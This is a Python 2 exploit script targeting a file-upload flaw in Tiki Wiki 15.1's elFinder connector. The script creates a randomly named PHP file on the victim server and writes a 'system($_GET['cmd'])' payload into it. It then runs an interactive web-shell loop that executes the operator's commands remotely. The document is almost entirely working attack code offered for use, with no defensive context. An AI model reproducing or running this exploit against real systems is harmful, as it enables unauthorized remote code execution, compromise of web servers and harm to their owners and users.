#!/usr/bin/python

#Author: loopspell (twitter.com/loopspell)


# Example: python exploit.py victim.com 80 tiki
# Example: python exploit.py victim.com 8282 tikiwikicms

import requests, sys
import random, string, urllib

def name_generator():	# Generate Malicious filename
	return ''.join(random.choice(string.ascii_lowercase) for _ in range(5))


def make_file(VulerablePATH,fileNAME):	# create malicious file via connector.minimal.php
	DataMKFILE = ({
					'cmd':'mkfile',
					'name':fileNAME,		# GET Request DATA
					'target':'l1_Lw'
		   		   })

	response = requests.get(VulerablePATH,DataMKFILE)
	
	if response.status_code != 200:
		print "Unable to Connect or Create File"
		print "HTTP Response Code: "+str(response.status_code)
		exit(0)


def data_insert(VulerablePATH,fileNAME):	# insert Simple Command Execute Code in malicious file via connector.minimal.php
	DataINS = urllib.urlencode({
       	                    	'cmd' : 'put',
           	                	'target' : 'l1_'+fileNAME.encode('base64','strict'),	# encode malicious filename into base64
               	            	'content' : '<?php system($_GET[\'cmd\']); ?>'		# Malicious Payload (Simple Command Execute)
                   	        	})
 
	response = requests.get(VulerablePATH,DataINS)
		
	if response.status_code != 200:
		print "Unable to Connect or Insert Data"
		print "HTTP Response Code: "+str(response.status_code)
		exit(0)


def webshell(CMSPATH,fileNAME):		# Access Malicious file to execute command directly via Terminal
	while True:
		fPATH = "/vendor_extra/elfinder/files/"
		fetchPATH = CMSPATH+fPATH+fileNAME
		cmd = raw_input('[w3bsh3ll]:~# ')	# user input for command

		if cmd.strip() == 'exit':
			exit(0)
		
		response = requests.get(fetchPATH,params={'cmd':cmd})
		print response.content


try:
	if len(sys.argv) < 2:
		print "\nUsage: " + sys.argv[0] + " <HOST> <PORT> <CMS_PATH>\n"
		sys.exit()
	
	vPATH = "/vendor_extra/elfinder/php/connector.minimal.php"
	CMSPATH = "http://"+sys.argv[1]+":"+sys.argv[2]+"/"+sys.argv[3]
	VulerablePATH = CMSPATH+vPATH

	print "\t--------------------------------------------------------------"
	print "\t|         Tiki Wiki 15.1 - File Upload Vulnerability         |"
	print "\t--------------------------------------------------------------"
	print "Vulnerable Host: "+sys.argv[1]
	print "Vulnerable Port: "+sys.argv[2]
	print "CMS PATH       : "+CMSPATH
	print "Vulnerable PATH: "+VulerablePATH+"\n"

	fileNAME = name_generator()+".php"
	make_file(VulerablePATH,fileNAME)		# create malicious file
	data_insert(VulerablePATH,fileNAME)		# insert payload in it
	webshell(CMSPATH,fileNAME)				# execute malicious file
	sys.exit()

except Exception as error:
	print 'Caught this error: ' + repr(error)